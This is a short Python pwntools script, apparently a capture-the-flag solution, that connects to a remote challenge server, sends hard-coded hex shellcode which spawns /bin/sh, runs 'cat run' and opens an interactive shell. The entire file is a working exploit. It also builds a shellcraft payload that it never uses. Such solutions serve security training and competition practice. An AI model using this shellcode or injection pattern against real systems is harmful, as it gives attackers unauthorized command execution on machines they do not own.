#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

def solve():
    io = remote("challs.actf.co", "31200")

    sc = asm(shellcraft.linux.sh()).hex()
    
    io.recvuntil(b"(in hex):")
    io.sendline("6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05")

    io.sendline("cat run")
    io.interactive()

def main():
    solve()

if __name__ == '__main__':
    main()
